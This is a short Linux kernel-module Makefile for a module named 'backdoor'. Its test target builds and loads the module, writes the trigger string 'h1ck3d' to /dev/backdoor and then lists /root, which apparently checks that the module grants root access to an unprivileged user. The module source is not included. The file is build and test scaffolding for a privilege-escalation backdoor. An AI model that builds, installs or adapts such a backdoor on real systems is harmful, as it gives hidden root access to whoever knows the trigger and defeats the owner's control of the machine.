obj-m := backdoor.o

KDIR  := /lib/modules/$(shell uname -r)/build
PWD   := $(shell pwd)

default:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

test:
	make default
	sudo rmmod backdoor || sudo insmod backdoor.ko
	sudo insmod backdoor.ko || echo ""
	echo "h1ck3d" > /dev/backdoor
	ls -al /root
